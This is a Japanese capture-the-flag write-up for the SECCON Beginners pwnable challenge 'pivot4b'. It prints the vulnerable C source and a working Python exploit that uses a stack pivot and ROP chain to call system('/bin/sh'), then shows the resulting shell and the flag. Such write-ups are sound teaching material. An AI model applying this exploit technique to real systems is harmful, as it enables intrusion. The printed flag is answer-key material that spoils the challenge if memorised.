# pivot4b:pwnable:394pts
スタックはあなたが創り出すものです。  
`nc pivot4b.challenges.beginners.seccon.jp 12300`  

[pivot4b.zip](pivot4b.zip)  

# Solution
接続先とソースが渡される。  
接続すると謎のメッセージを送れるサービスが始まる。  
```bash
$ nc pivot4b.challenges.beginners.seccon.jp 12300
Welcome to the pivot game!
Here's the pointer to message: 0x7ffc15c02c20
> SATOKI
Message: SATOKI
```
ソースは以下の通りであった。  
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gift_set_first_arg() {
	asm volatile("pop %rdi");
	asm volatile("ret");
}

void gift_call_system() {
	system("echo \"Here's your gift!\"");
}

int main() {
	char message[0x30];

	printf("Welcome to the pivot game!\n");
	printf("Here's the pointer to message: %p\n", message);

	printf("> ");
	read(0, message, sizeof(message) + 0x10);

	printf("Message: %s\n", message);

	return 0;
}


__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(120);
}
```
最初に`message`のスタックアドレスが表示されているようだ。  
`main`に自明なBOFがあり、`gift_set_first_arg`のガジェットや`gift_call_system`の`system`などギフトも多い。  
ただし、`0x10`のオーバーフローしか行えないので、問題名の通りスタックピボットしてROPする必要がありそうだ。  
オーバーフロー上半分でピボット先のアドレスを、下半分で`leave; ret;`ガジェットの実行を行うことでうまくスタックを指定できる。  
指定先を表示されている`message`のスタックアドレスにすれば、それ以降の0x28(0x30-0x8)分のROPが可能となる。  
先頭に`/bin/sh\x00`を詰めれば、文字列へのアドレスもわかって一石二鳥となる。  
以下のsolve.pyで行う。  
```py
from ptrlib import *

elf = ELF("./chall")
# sock = Process("./chall")
sock = Socket("nc pivot4b.challenges.beginners.seccon.jp 12300")

message = int(sock.recvlineafter("pointer to message: "), 16)
print(f"message:", hex(message))

payload = b"/bin/sh\x00"
payload += p64(next(elf.gadget("pop rdi; ret;")))
payload += p64(message)
payload += p64(next(elf.gadget("ret;")))
payload += p64(elf.plt("system"))
payload += b"A" * 0x8
payload += p64(message)
payload += p64(next(elf.gadget("leave; ret;")))

sock.sendlineafter("> ", payload)

sock.sh()
```
実行する。  
```bash
$ python solve.py
[+] __init__: Successfully connected to pivot4b.challenges.beginners.seccon.jp:12300
message: 0x7ffcdcb0ec50
[ptrlib]$ Message: /bin/sh
[ptrlib]$ ls
flag-bce7759151aa98ff2e61358f578ec2eb.txt
run
[ptrlib]$ cat flag-bce7759151aa98ff2e61358f578ec2eb.txt
ctf4b{7h3_57ack_c4n_b3_wh3r3v3r_y0u_l1k3}
```
シェルが取れ、ファイルにflagが書かれていた。  

## ctf4b{7h3_57ack_c4n_b3_wh3r3v3r_y0u_l1k3}